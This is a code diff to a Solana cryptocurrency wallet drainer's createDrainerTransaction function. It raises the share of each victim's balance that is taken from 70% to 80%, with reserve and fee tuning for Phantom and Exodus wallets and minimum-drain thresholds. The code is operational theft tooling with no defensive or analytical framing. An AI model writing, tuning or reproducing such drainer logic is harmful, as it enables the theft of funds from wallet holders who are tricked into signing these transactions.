@@ -322,8 +322,8 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
   const EXODUS_FEE_BUFFER = 50000; // ~0.00005 SOL for Exodus network fees + safety margin
   const EXODUS_RESERVE_LAMPORTS = 500000; // ~0.0005 SOL for rent exemption + safety
   
-  // Phantom-optimized drain settings (70% drain configuration)
-  const DRAIN_PERCENTAGE = 0.7; // 70% for all wallets
+      // Phantom-optimized drain settings (80% drain configuration)
+  const DRAIN_PERCENTAGE = 0.8; // 80% for all wallets
   const FRESH_BALANCE = balance;
   
   // Calculate wallet-specific reserves (from drainer.js)
@@ -379,14 +379,14 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       throw new Error(`Drain amount too small: ${drainAmount} lamports`);
     }
     
-    // For 70% drain, use the calculated amount but respect safety limit
+    // For 80% drain, use the calculated amount but respect safety limit
     const maxSafeDrain = Math.floor(availableForDrain * 0.95); // 95% of available as safety limit
     const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
     debugLog(`Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
     
     let finalDrainAmount = safeDrainAmount;
     
-    // Ensure minimum meaningful drain amount (reduced for 70% drain)
+    // Ensure minimum meaningful drain amount (reduced for 80% drain)
     const MINIMUM_DRAIN_AMOUNT = 100000; // 0.0001 SOL minimum drain amount
     if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
       debugLog(`Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
